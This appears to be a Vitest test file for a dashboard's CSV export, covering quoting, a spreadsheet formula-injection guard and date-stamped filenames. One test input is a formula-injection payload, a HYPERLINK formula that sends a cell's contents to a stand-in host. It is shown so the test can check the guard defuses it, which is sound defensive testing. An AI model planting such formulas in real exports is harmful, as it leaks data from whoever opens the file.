/**
 * CSV quoting, the formula guard, and the filename stamp.
 *
 * The DOM half of `ui/export.js` is exercised in `test/dom/table.test.js`, where
 * there is a real button to press. What is here is the part that is pure string
 * work and the part that is a security property — a spreadsheet formula smuggled
 * through a cell is not visible in any screenshot of the dashboard it came from.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { csv_cell, to_csv, slug_name, stamp } from "../../ui/export.js";
import { setHost, resetHost, TestHost } from "../../core/host.js";

describe("csv_cell", () => {
	it("leaves an ordinary value alone", () => {
		expect(csv_cell("edge-01")).toBe("edge-01");
		expect(csv_cell(42)).toBe("42");
	});

	it("writes an empty field for nothing at all", () => {
		expect(csv_cell(null)).toBe("");
		expect(csv_cell(undefined)).toBe("");
	});

	it("quotes a field holding a comma, a quote or a newline", () => {
		expect(csv_cell("Acme, Inc")).toBe('"Acme, Inc"');
		expect(csv_cell('he said "no"')).toBe('"he said ""no"""');
		expect(csv_cell("line\nbreak")).toBe('"line\nbreak"');
	});

	it("defuses a value a spreadsheet would run as a formula", () => {
		// The tab is what makes it text. The visible content is unchanged, which is
		// the point: this must not quietly rewrite what the reader exported.
		expect(csv_cell("=1+1")).toBe("\t=1+1");
		expect(csv_cell('=HYPERLINK("http://x/"&A1)')).toBe('"\t=HYPERLINK(""http://x/""&A1)"');
		expect(csv_cell("+44 20 7946")).toBe("\t+44 20 7946");
		expect(csv_cell("-3.4%")).toBe("\t-3.4%");
		expect(csv_cell("@here")).toBe("\t@here");
	});
});

describe("to_csv", () => {
	it("joins fields with commas and records with CRLF", () => {
		expect(
			to_csv([
				["Node", "Response"],
				["edge-01", "42 ms"],
			]),
		).toBe("Node,Response\r\nedge-01,42 ms");
	});

	it("survives a grid with nothing in it", () => {
		expect(to_csv([])).toBe("");
	});
});

describe("stamp", () => {
	beforeEach(() => setHost(new TestHost({ today: "2026-08-13" })));
	afterEach(() => resetHost());

	it("carries the day the export was taken", () => {
		expect(stamp("Edge nodes", "csv")).toBe("edge-nodes-2026-08-13.csv");
	});

	it("takes the date from the host, not the clock", () => {
		setHost(new TestHost({ today: "2020-01-02" }));
		expect(stamp("chart", "png")).toBe("chart-2020-01-02.png");
	});

	it("never produces a name that is only an extension", () => {
		expect(slug_name("···")).toBe("export");
		expect(stamp("", "csv")).toBe("export-2026-08-13.csv");
	});
});
